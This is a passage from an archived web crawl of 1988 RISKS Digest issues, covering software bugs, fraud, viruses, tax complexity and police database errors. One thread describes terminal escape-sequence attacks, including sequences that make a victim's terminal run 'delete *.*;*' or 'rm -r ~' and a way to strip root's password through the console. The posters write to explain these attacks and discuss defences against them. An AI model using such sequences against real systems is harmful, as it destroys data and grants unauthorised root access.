13 Mar 88 15:45:26 GMT
</i><PRE>
Organization: Public Access - Houston, Tx

Many calculators [have some sort of self-test]. They come up with all
segments lit. That way you can tell when they're bad.  Gas pumps do this
too... ever noticed digital gas pump displays showing 8888.88 before you
start pumping?

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Calculator Self-tests: My HP34C has a full functional self-test
</A>
</H3>
<address>
Karl Denninger
&lt;<A HREF="mailto:ames!lll-crg!lll-winken!ddsw1!karl@ucbvax.berkeley.edu ">
ames!lll-crg!lll-winken!ddsw1!karl@ucbvax.berkeley.edu 
</A>&gt;
</address>
<i>
Fri Mar 11 11:05:24 1988
</i><PRE>
Organization: Macro Computer Solutions, Inc., Mundelein, IL

The HP34C has a sequence, which you ask for by hitting &lt;STO&gt; &lt;ENTER&gt;, which
does a full functional self-test.  You get all segments lit if all is ok,
or an error code (or a dead unit) if it fails.  The manual claims that it
is a full computational and functional test (and it does take a couple of
seconds to run).

I use it every time I power the thing on.

Karl Denninger		       |  Data: +1 312 566-8912
Macro Computer Solutions, Inc. | Voice: +1 312 566-8910
...ihnp4!ddsw1!karl	       | "Quality solutions for work or play"

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Trying harder on complex tasks than on simpler tasks
</A>
</H3>
<address>
Robert Oliver
&lt;<A HREF="mailto:rabbit1!robert@csl.sri.com ">
rabbit1!robert@csl.sri.com 
</A>&gt;
</address>
<i>
10 Mar 88 20:45:26 GMT
</i><PRE>
Organization: Rabbit Software Corp., Malvern PA

My experience indicates that we often DO try harder on complex tasks than on
simple ones.  In working on a large on-line transaction processing system, it
was observed by various people (notably those responsible for testing and
quality assurance) that whenever we completed major overhauls of the system,
it often passed the tests with little trouble and did not "crash" when
eventually run live.  New versions which contained simple fixes or minor
modifications inevitably acted mysteriously during testing or catastrophically
when put on-line.

What this implied was that complex changes garnered more of our attention  
than simple changes when we were analyzing the problem, designing and 
implementing the change, and testing the final product.  This is not to imply 
that we were simply careless when making simple changes.  On the contrary, 
we were much more careful than most software groups I have seen.  However, 
the simple changes did not elicit that keen level of awareness needed to 
adequately foresee hidden problems and to test for such possible cases.  

Careless, no.  Less careful, less alert, less interested, maybe.  It's not 
only a very gray area, but it's also a tough problem to correct.  One can 
state that, "when making simple changes, remember to be just as 
alert and think just as clearly as when making complex changes," but the 
very nature of the problem will often undermine this maxim.

Robert Oliver			
Rabbit Software Corp.		(215) 647-0440
7 Great Valley Parkway East     ...!ihnp4!{cbmvax,cuuxb}!hutch!robert
Malvern, PA  19355		...!psuvax!burdvax!hutch!robert

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Police using computers - License plate matches - etc, etc.
</A>
</H3>
<address>
Ted G. Kekatos
&lt;<A HREF="mailto:moss!ihuxv!tedk@rutgers.edu ">
moss!ihuxv!tedk@rutgers.edu 
</A>&gt;
</address>
<i>
9 Mar 88 22:27:44 GMT
</i><PRE>
Organization: AT&amp;T Bell Laboratories - Naperville, Illinois

All this talk about innocent people vs. police computers reminds me of the
Movie "Brazil". If you have not seen it, it is available in video tape.

The same RISKS question comes up again: If the "computer system" helps the
police to find one (1) indeed "bad" person, and also find one (1) indeed
innocent person, are we willing to deal with the consequence.

Ted G. Kekatos    backbone!ihnp4!ihuxv!tedk (312) 979-0804 
AT&amp;T Bell Laboratories, Indian Hill South, IX-1F-460 Naperville &amp; Wheaton Roads
Naperville, Illinois. 60566 USA

     [If you are looking for one person and you find two, you have some
     incentive to probe further.  The problem is when you get only one,
     and it is the wrong person.  But ultimately it is how the query response
     is handled that matters.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.41.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.43.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-78</DOCNO>
<DOCOLDNO>IA012-000129-B043-316</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.43.html 128.240.150.127 19970217020057 text/html 21932
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:59:24 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 43</TITLE>
<LINK REL="Prev" HREF="/Risks/6.42.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.44.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.42.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.44.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 43</H1>
<H2>  Monday 14 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Leap-Year No-bull Prize Swap-Meat 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  A Copycat Scam, or, Ignorance is Bliss 
</A>
<DD>
<A HREF="#subj2.1">
Ted M P Lee
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  RISKS of programmable function keys 
</A>
<DD>
<A HREF="#subj3.1">
Darrell Long
</A><br>
<A HREF="#subj3.2">
 Dave Platt
</A><br>
<A HREF="#subj3.3">
 A.E. Mossberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: CONNECT FROM "password stealer" 
</A>
<DD>
<A HREF="#subj4.1">
Peter da Silva
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Setting Clocks Backward 
</A>
<DD>
<A HREF="#subj5.1">
Scott Dorsey
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Date formats 
</A>
<DD>
<A HREF="#subj6.1">
Rahul Dhesi
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  End-Of-File checking 
</A>
<DD>
<A HREF="#subj7.1">
Peter Zadrozny
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Taxing situations:  Risks of unbridled complexity 
</A>
<DD>
<A HREF="#subj8.1">
Nelson Weiderman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Virus file 
</A>
<DD>
<A HREF="#subj9.1">
Robert Slade
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
The Cow Leaped over the Computer, or Leap-Year No-bull Prize Swap-Meat
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Mon 14 Mar 88 11:30:11-PST
</i><PRE>

The Xtra supermarket chain was fined $1,000 for illegal meat labels
that were produced by their computer system on 27 February 1988 with a
three-day expiration date of 2 March instead of 1 March -- because the
computer program did not know about leap years.

From the Miami Herald, 4 March 1988, p. 3D, thanks to Jai Navlakha, School 
of Computer Science, Florida International University, Miami FL 33199.

    [Coincidentally, Donn Parker just informed me that the previously 
    anticipated 2 March Trojan horse event has indeed now appeared in a
    commercial product, and in the freeware FREEHAND.  Stay tuned for 
    details -- if we get any.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 A Copycat Scam, or, Ignorance is Bliss
</A>
</H3>
<address>
&lt;<A HREF="mailto:TMPLee@DOCKMASTER.ARPA">
TMPLee@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Mon, 14 Mar 88 12:29 EST
</i><PRE>

Those of you who attended the last NBS/DoD National Computer Security 
Conference (in Baltimore) may remember a talk about someone with little
computer literacy who used his PC (Commodore or Atari or something like that)
to mount a scam against a merchandizing chain; the scam was very similar to the
one in the attached item from a recent Minneapolis Star &amp; Tribune newspaper. (I
forgot to note the date when I clipped it; sometime in the last few days,
probably Saturday.)  One wonders a) if this is a copycat operation and b) why
knowledge of the incident reported at Baltimore was not communicated through
the appropriate industry security association (the chain involved in the
Baltimore report took special steps afterwards to make sure the same scam
couldn't be repeated on them.)  There's gotta be a RISK in that somewhere.

                                                                 Ted Lee

COMPUTER USER CHARGED IN REFUND FRAUD

A Minneapolis man adept at using his personal computer has been charged with
counterfeiting computerized Target [a mostly-local discount chain store] sales
receipts and then going back to the store to get fraudulent refunds.  Police
said David Howe, 21, 2700 3rd Av. S. was charged with theft by swindle of at
least $250.

According to a criminal complaint filed Thursday, store officials believe Howe
and two juvenile accomplices were responsbile for more than $10,000 in illegal
cash refunds.  The complaint said Howe would counterfeit a receipt using a
computer and a blank role of Target cash register tape [the story doesn't say
where he got the tape], then go back to the store and claim he bought an item
and that it was now on sale at a lower price.  Target has a store policy of
refunding the difference.

The juveniles have not been charged.

The complaint said the counterfeit receipts were used at several Target stores
in the Twin Cities, but that the investigation centered at [a particular store.]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
RISKS of programmable function keys
</A>
</H3>
<address>
Darrell Long
&lt;<A HREF="mailto:darrell%cs@ucsd.edu ">
darrell%cs@ucsd.edu 
</A>&gt;
</address>
<i>
Mon, 14 Mar 88 11:00:11 PST
</i><PRE>

I remember when I was an undergraduate there were Teleray T-1061
terminals connected to all the machines for general use.  A certain
group of nasty, naughty undergraduates (not me of course), used to
change their process name (this was a VMS system) to escape sequences.

The sequence went something line this: ^[xlogout^M^[y^[z Where ^[x means
begin loading a function key, ^[y end loading, and ^[z means execute it.

Fortunately loading the function key with "logout" is about as nasty as it
got, ^[xdelete *.*;*^M^[y^[z would have really been bad news.

This seems to be a general problem with terminals with programmable function
keys.  Even if you delete remote execution of function keys, if you have a
reflect mode (as does Wyse) then similar things can occur.

The scary thing is that all it took was a quick call to sys$setprn() -- an
unpriviledged function, and certainly something irresistable to u-grads.

Darrell Long, Department of Computer Science and Engineering, C-014
University of California, San Diego, La Jolla, California  92093

ARPA: Darrell@Beowulf.UCSD.EDU         UUCP: sdcsvax!beowulf!darrell

</PRE>
<HR><H3><A NAME="subj3.2">
Wyse terminals, etc.
</A>
</H3>
<address>
Dave Platt
&lt;<A HREF="mailto:dplatt@coherent.com ">
dplatt@coherent.com 
</A>&gt;
</address>
<i>
Mon, 14 Mar 88 16:19:16 PST
</i><PRE>

I've heard of similar trojan-horse ASCII sequences being used on other
systems.  Sorry I can't quote specifics, but as I recall the method
used was to stuff the terminal's "answerback buffer" with a command
similar to a unix "rm -r ~", and then send an ENQ to the terminal...
thus causing the terminal to submit a recursive-delete-everything command
to the host.  Pretty nasty...

This sort of problem can occur whenever two conditions exist:

(1) The terminal has some internal memory that can be set by sending one
    series of characters, and can be replayed (sent to the host) by sending
    another set of characters.
    
(2) It's possible for a user who isn't the "owner" of a terminal to send
    the necessary character sequences to the terminal, either directly (e.g.
    "cat horrible-nasty &gt;/dev/ttyd4") or indirectly, via a trojan-horse
    message.

A system on which I spent quite a few years working (Honeywell CP-6) had a
fairly solid defense against this sort of thing.  Users were not permitted
to write directly to other users' terminals, thus plugging the "direct"
attack;  and, by default, text written to a "unit-record" device (of which
a terminal was one variety) was normally passed through a "printable characters
only" filter that stripped out control characters, thus making it impossible
for a mail message (e.g.) to contain a control sequence that would trigger
funky behavior in the terminal.  A program which wished to write data
that contained control characters was (is) required to set the "transparent
mode" bit on the M$WRITE system call, thus disabling the filter for the
duration of that one write.  The mail software didn't request transparent
mode, and thus couldn't be used to graunch someone's terminal.

</PRE>
<HR><H3><A NAME="subj3.3">
Re: Problems with Wyse terminals
</A>
</H3>
<address>
a.e. mossberg 
&lt;<A HREF="mailto:aem@miavax.miami.edu">
aem@miavax.miami.edu
</A>&gt;
</address>
<i>
Sun, 13 Mar 88 22:05:38 EDT
</i><PRE>

In the comments by A.Cunnigham about problems at Edinburgh with Wyse
terminals, the exact problem is not made clear.  It is called "smart
terminals".  Most, if not all, terminals are designed to perform various
actions upon receipt of control sequences, including sending to the host
computer the contents of the screen or of a buffer.  It is very easy to
send such a terminal a sequence to 

	a) lock the keyboard
	b) clear the screen
	c) send some output to the screen
		(such as a command sequence to change file permissions)
	d) and command the terminal to echo the screen buffer back to
		the host for execution.

With the commands such as 'write' it is a simple matter on a UNIX system to
send to the operator's console a sequence to lock the console, clear the
screen, write out the commands to edit the 'root' login in /etc/passwd (to
remove the password) and have those commands executed by the system.  This
is a problem that I've seen reported elsewhere, and have been able to
duplicate it on my systems here.  All that it requires is knowledge of the
control sequences to send to the terminal, easily found.

Andrew Mossberg - aem@miavax.miami.edu

p.s. I have 'mesg n' set as default in /usr/skel/.login, which helps
	to prevent this.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: CONNECT FROM "password stealer" (<A HREF="/Risks/6.34.html">RISKS-6.34</A>)
</A>
</H3>
<address>
Peter da Silva
&lt;<A HREF="mailto:nuchat!sugar!peter@uunet.UU.NET ">
nuchat!sugar!peter@uunet.UU.NET 
</A>&gt;
</address>
<i>
11 Mar 88 08:26:26 GMT
</i><PRE>
Organization: Sugar Land UNIX - Houston, TX

So much for uucp via PC-Pursuit. I hope all you sites out there using PCP
are installing front-ends to handle the PC-Pursuit handshaking (and looking
for the CONNECT FROM string) before letting poor old L.sys loose on it.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Setting Clocks Backward (<A HREF="/Risks/6.41.html">RISKS-6.41</A>)
</A>
</H3>
<address>
Scott Dorsey
&lt;<A HREF="mailto:kludge@pyr.gatech.edu ">
kludge@pyr.gatech.edu 
</A>&gt;
</address>
<i>
Sun, 13 Mar 88 11:00:25 EST
</i><PRE>

In Risks 6/41, John Taylor talks about the time being set back on a billing
computer at The Phone Company, and the resultant problems.
   As a student at William and Mary, I noticed that the system date on the
Pr1me machines was incorrect, seemingly because the time had been set to pm.
instead of am.  So, being an honorable fellow, I informed the operator, who
promptly changed the system date.  The WATCHDOG system, running in the
background, noticed that there were several users who had not done anything
for the past 24 hours, and these people were bumped off the system.
   There is a risk here somewhere.  Please, no "Pr1me Time" puns, or anything
referring to machines eating dates.

Scott Dorsey   Kaptain_Kludge
SnailMail: ICS Programming Lab, Georgia Tech, Box 36681, Atlanta, Georgia 30332
uucp:	...!{decvax,hplabs,ihnp4,linus,rutgers,seismo}!gatech!gitpyr!kludge

        [Eating time?  Man eating sharks?  How many could he eat?
        TIME honored watches?  (Awarded Man of the Year?)  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Date formats (<A HREF="/Risks/6.41.html">RISKS-6.41</A>)
</A>
</H3>
<address>
Rahul Dhesi
&lt;<A HREF="mailto:iuvax!bsu-cs!dhesi@sri-unix.ARPA ">
iuvax!bsu-cs!dhesi@sri-unix.ARPA 
</A>&gt;
</address>
<i>
Sat, 12 Mar 88 16:29:14 EST
</i><PRE>
Organization: CS Dept, Ball St U, Muncie, Indiana

In <A HREF="/Risks/6.41.html">RISKS-6.41</A> you write about misinterpretation of the date 4.12.87:
&gt; But this one is a little like trying to get the others to drive on the
&gt; right (or left, depending upon which is right) side of the road.  PGN]

This is a terrible analogy.  Driving on the right or left is a purely
arbitrary decision.  Using "4.12.87" to mean "month.day.year", on the
other hand, is illogical, because it doesn't put fields in order of
increasing or decreasing significance.

Rahul Dhesi         UUCP:  &lt;backbones&gt;!{iuvax,pur-ee,uunet}!bsu-cs!dhesi

      [Your very logical moderator has systematically used DAY MONTH YEAR
      throughout all volumes of RISKS.  But there shoul be more advocates of
      YEAR MONTH DAY, which is MUCH MORE LOGICAL, especially if you like
      mixed radix numbers.  PGN writing at 1988:03:13:11:18:59...]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
End-Of-File checking
</A>
</H3>
<address>
Peter Zadrozny
&lt;<A HREF="mailto:edsews!peter@uunet.UU.NET ">
edsews!peter@uunet.UU.NET 
</A>&gt;
</address>
<i>
Mon, 14 Mar 88 08:46:38 EST
</i><PRE>

Reading about all this leap year problems on  computer  programs  reminds  me  of  a  simpler  problem like End Of File
detection.  I started working here in the U.S. the next  day
I  came  from  Venezuela.  However my social security number
was not given to me until six weeks after I applied for  it,
so  the  payroll department decided that my temporary number
would be 999-99-9999. You guessed it,  the  payroll  program
blew up, it took them over a week to get the problem fixed.

This fact was also popular to my fellow countryman that would come to the
U.S. as undergrad or graduate students.  Since they where not required to
have a social security number the various universities would assign them
999-99-9999. I was just delighted to hear from them how in some cases over
half of the systems would blow up.

One would think that something so basic and simple as EOF checking is not a
cause for problems...

                        [By now RISKS readers must suspect that NOTHING is so 
                        basic and simple to not be a cause for problems.  PGN]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Taxing situations:  Risks of unbridled complexity
</A>
</H3>
<address>
&lt;<A HREF="mailto:Nelson.Weiderman@sei.cmu.edu">
Nelson.Weiderman@sei.cmu.edu
</A>&gt;
</address>
<i>
14 Mar 1988 08:53-EST
</i><PRE>

Since it is almost tax time, it seems appropriate to initiate some
discussion of the risk of computers making our tax code so complex that that
nobody, including the individual taxpayer, the IRS, the accountants, or the
brokerage houses can understand it.  The latest issue of Money magazine has
an article describing the result of presenting a tax scenario to 50
different tax preparers.  They came up with 50 different amounts for the
taxes due and the range was from $7,000 to over $11,000.  Recent news
stories indicate that even for the "easy" questions the IRS gives the wrong
answers about half the time

Consider Original Issue Discounts (OIDs) as an example.  When you purchase a
bond at a discount (such as a zero coupon bond), the IRS requires that you
pay taxes on amount you would have received annually in interest if it were
not purchased at a discount.  The amount of the OID that is reportable each
year is a function of when you purchased the bond, the amount you paid for
the bond, the maturity date and the maturity value of the bond.  From those
inputs you compute the annual effective yield and the amount of interest due
each year from the purchase price until the maturity date.  Sounds
straightforward enough, but there are several complications.

1.  If held by a brokerage house, the broker may not know when you
originally purchased the bond and need only report to the IRS the OID you
would have owed if you had bought the bond at the issue date.  This may
differ considerably from what you really owe because the value of the bond
fluctuates with interest rates.  The broker's statement refers you to
Publication 1212 to compute your real reportable interest.  (How many people
are aware of this?)

2.  Publication 1212 gives you a formula for computing the effective annual
yield (only the first step) but the formula works only if you buy the bond
on the same day of the year as the maturity date.  That is unhelpful to
99.7% of the purchasers.  For those so unfortunate to have bought their bonds
on one of the other 364 days of the year, Publication 1212 says:  "...the
calculation of the yield to maturity is more complex.  In this case consult
your broker or your tax advisor for this information."  (I believe that 
numerical methods are required to compute the yield).

3.  If you made your purchase before 1985 you assume annual compounding and
if purchased after January 1, 1985 then you compute yield to maturity using
semi-annual compounding which complicates matters a little more.

4.  If your "accrual periods" (years or half years) do not correspond with
calendar years, then you need to allocate the proportional amounts of each
of the accrual periods to the appropriate calendar periods.  

Is there any doubt that this complexity was brought about by the misuse of
computers?  Could the banks and brokerage houses and accountants have coped
with this law without computers?  How many people really understand what is
going on?  Publication 1212 deals only with OIDs.  It has 12 pages of
instructions and 66 pages more of tables giving individual issues.  And it
still does not give enough information to complete your tax return.

I have always done my own taxes and I want to continue to do so, so I wrote a
200 line Pascal program to compute my OIDs.  In the process I discovered
that the OIDs being reported to me by the brokerage house were too large by
a factor of more than 2.  Calls to the customer service line indicated that
yes, indeed, they were having "systems problems" with the OIDs and they
would send out corrected statements.  Fortunately their computer tapes do
not go to IRS until April.  

The promise of computers was to make our lives easier and simpler by taking
over complex calculations that we had previously done by hand.  Instead they
have permitted unbridled (and unwarranted) complexity and loss of control of
our information systems.  With respect to taxes (and many other systems) the
risk is that they allow the users of the technology to worsen, rather than
improve, the quality of our lives.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Virus file
</A>
</H3>
<address>
&lt;<A HREF="mailto:Robert_Slade@mtsg.ubc.ca">
Robert_Slade@mtsg.ubc.ca
</A>&gt;
</address>
<i>
Mon, 14 Mar 88 08:05:54 PST
</i><PRE>

HELP!
 
I am flooded with requests for my file on viri.  As I stated before the thing
is *70 PAGES LONG*!  And it's not *editted* yet.  For those who must
desperately have a copy *now*, please send mail address.  I daren't create
my own mail bug by trying to post copies of a 200 k file all over creation.

    [And many of you did not even have his full net address before!  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.42.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.44.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-79</DOCNO>
<DOCOLDNO>IA012-000129-B044-2</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.44.html 128.240.150.127 19970217020109 text/html 23825
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:59:38 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 44</TITLE>
<LINK REL="Prev" HREF="/Risks/6.43.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.45.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.43.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.45.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 44</H1>
<H2>  Wednesday 16 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Terry Dean Rogan, concluded (for now)  
</A>
<DD>
<A HREF="#subj1.1">
Hal Perkins
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  RISKS in Bell lawsuit 
</A>
<DD>
<A HREF="#subj2.1">
Alan Wexelblat
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Hackers to Face Jail or Fines 
</A>
<DD>
<A HREF="#subj3.1">
Anne Morrison
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Risk in submarine accident; MAC Virus arrives in Germany;     German Hacker arrested in Paris 
</A>
<DD>
<A HREF="#subj4.1">
Klaus Brunnstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  RISKS in the U.S. Government Archives 
</A>
<DD>
<A HREF="#subj5.1">
sethk
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  MacMag virus infects commercial software 
</A>
<DD>
<A HREF="#subj6.1">
Dave Platt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  More on the Brandow virus 
</A>
<DD>
<A HREF="#subj7.1">
Dave Curry
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Terry Dean Rogan, concluded (for now)
</A>
</H3>
<address>
Hal Perkins
&lt;<A HREF="mailto:hal@gvax.cs.cornell.edu ">
hal@gvax.cs.cornell.edu 
</A>&gt;
</address>
<i>
Tue, 15 Mar 88 13:10:13 EST
</i><PRE>

[This case has been discussed in Risks in the past, so readers might
be interested in the outcome.]

From the New York Times, Sunday March 6, 1988, section 1, page 30.

Wrong Suspect Settles His Case for $55,000

Saginaw, Mich., March 5 (AP) -- Terry Dean Rogan, who [was] arrested
five times in Michigan and Texas for crimes he did not commit, has
settled a lawsuit against the City of Los Angeles for failing to remove
his name from a crime computer's file.

Mr. Rogan, who is 30 years old, sued Los Angeles, its Police Department
and two detectives, saying his civil rights were violated when the
department neglected to remove his name from a nationwide crime
computer file.  The settlement, approved by the Los Angeles City
Council Friday, calls for Mr. Rogan to receive $55,000.

Last July, a Federal district judge in Los Angeles ruled that Mr. Rogan
should be paid damages.  The murders and robberies he was charged with
were ultimately traced to an Alabama jail inmate, Bernard McKandes.

Mr. McKandes was found to have assumed Mr. Rogan's identity after Mr.
Rogan apparently discarded a copy of his birth certificate.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
RISKS in Bell lawsuit
</A>
</H3>
<address>
Alan Wexelblat 
&lt;<A HREF="mailto:wex%SW.MCC.COM@MCC.COM">
wex%SW.MCC.COM@MCC.COM
</A>&gt;
</address>
<i>
Tue, 15 Mar 88 15:20:20 CST
</i><PRE>

I'm sure everyone has, by now, read about Bell Helicopter's settlement
with the government in which they repaid $85.1 million in overcharges.
However, in an article by Mark Thompson (Knight-Ridder News Service),
the following quotes caught my eye:

	"[The settlement] stems from Bell's computerized accounting
	system which government investigators claim shifted costs
	among the contracts..."

[note how the computer is blamed, not the programmer, nor the people who
used it nor the people who ordered it programmed/used in that way!]

	"The $85.1 million settlement is only half the size of the
	government's estimated loss ...  But [government] officials
	said the case was so complex that court action to recoup the
	funds probably would have failed."

